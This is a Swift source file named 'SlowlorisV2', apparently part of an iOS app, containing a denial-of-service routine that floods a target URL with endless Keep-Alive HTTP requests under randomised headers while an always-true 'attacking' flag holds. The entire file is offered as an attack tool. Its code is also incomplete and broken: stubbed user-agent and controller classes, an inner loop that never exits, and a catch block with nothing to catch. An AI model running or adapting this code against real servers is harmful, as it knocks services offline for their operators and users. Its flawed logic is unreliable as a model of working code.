//
//  SlowlorisV2.swift
//  TCA
//
//  Created by Thaw De Zin on 9/5/23.
//

import SwiftUI

let attackController = AttackController()
var timer: Timer?

func f6iBackup(url: String, input: Int) async {
    var allTheSockets: [URLSessionDataTask] = []

    // Define a task creation function
    func createTask() async {
        let session = URLSession.shared
        var headers = [
            "Accept-Language": "en-US,en,q=0.5",
            "Connection": "Keep-Alive"
        ]

        while attackController.getIsAttacking() {
            headers["User-Agent"] = getRandomUserAgent()
            headers["X-a"] = "\(Int.random(in: 0..<5000))"

            var request = URLRequest(url: URL(string: url)!)
            request.allHTTPHeaderFields = headers
            let task = session.dataTask(with: request) { (data, response, error) in
                if error == nil {
                    print("[-][-][*] Waiter sent.")
                } else {
                    print("[-] A socket failed, reattempting...")
                }
            }
            task.resume()

            allTheSockets.append(task)
        }
    }

    print(url)
    print(input)
    print("check them")

    do {
        let howManySockets = input

        print("Creating sockets...")
        for _ in 0..<howManySockets {
            guard attackController.getIsAttacking() else {
                print("Attack is stopped")
                break
            }

            await createTask()
            print("try?")
        }

        print("\(howManySockets) sockets are ready.")
    } catch {
        if (error as? URLError)?.code == .networkConnectionLost {
            print("[-] Connection refused, retrying...")
        }
    }
}

func getRandomUserAgent() -> String {
    // Implement your logic to generate a random user agent here
    return ""
}

class AttackController {
    // Implement your AttackController class here
    func getIsAttacking() -> Bool {
        // Return the value indicating whether the attack is still active
        return true
    }
}
